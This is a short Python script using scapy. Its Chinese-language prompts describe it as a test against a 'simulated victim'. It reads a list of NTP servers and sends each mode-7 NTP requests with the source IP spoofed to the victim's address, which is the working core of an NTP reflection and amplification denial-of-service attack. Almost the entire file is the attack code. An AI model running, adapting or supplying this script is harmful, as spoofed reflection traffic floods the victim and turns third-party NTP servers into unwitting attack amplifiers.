from scapy.layers.inet import IP, UDP
from scapy.layers.ntp import NTP
from scapy.all import send
from random import randint

target = input("请输入模拟被害者的IP（输入前请先在模拟机上tcpdump抓包）: ")


def test_ntp_server(ntp_server, count=10):
    print(f"测试NTP服务器: {ntp_server}")
    for i in range(count):
        try:
            sport = randint(40000, 50000)  # 选择40000到50000之间的随机端口
            packet = IP(dst=ntp_server, src=target) / UDP(sport=sport, dport=123) / NTP(version=2, mode=7, stratum=0,
                                                                                        poll=3, precision=42)
            send(packet)

        except:
            pass


def test_ntp_servers(filename="top.txt"):
    with open(filename, "r") as file:
        for line in file:
            ntp_server = line.strip()
            test_ntp_server(ntp_server)


if __name__ == "__main__":
    test_ntp_servers()

